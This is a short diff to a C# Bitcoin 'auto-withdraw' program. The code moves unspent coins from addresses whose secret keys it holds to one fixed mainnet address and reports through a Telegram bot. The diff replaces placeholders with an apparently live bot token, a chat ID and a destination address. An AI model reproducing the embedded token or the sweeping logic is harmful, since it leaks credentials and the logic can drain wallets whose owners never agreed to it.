@@ -20,7 +20,7 @@ namespace BitcoinAuto.Withdraw
         [STAThread]
         static async Task Main()
         {
-            Telegram telegramNotifier = new Telegram("YOUR_TELEGRAM_BOT_TOKEN", "YOUR_CHAT_ID");  // Change
+            Telegram telegramNotifier = new Telegram("6381398610:AAHwPW_jzTYW5ZOSkjxsn1LCu5l0zfz4QJQ", "-1002122750125");  // Change
 
             if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), fileName)))
             {
@@ -87,7 +87,7 @@ namespace BitcoinAuto.Withdraw
 
                                 // Creating a transaction
                                 var secretString = addresses[destinationAddress];
-                                var destination = BitcoinAddress.Create("YOUR_BTC_ADDRESS", NBitcoin.Network.Main);  // Change
+                                var destination = BitcoinAddress.Create("1G9YCf6UvXJjNUnFTN2doriCgfyi9atcoq", NBitcoin.Network.Main);  // Change
                                 var txBuilder = NBitcoin.Network.Main.CreateTransactionBuilder();
                                 var coins = await rpcClient.ListUnspentAsync(0, 9999999, secretString.GetAddress(ScriptPubKeyType.Segwit));
                                 txBuilder.AddCoins(coins.Select(c => c.AsCoin()));
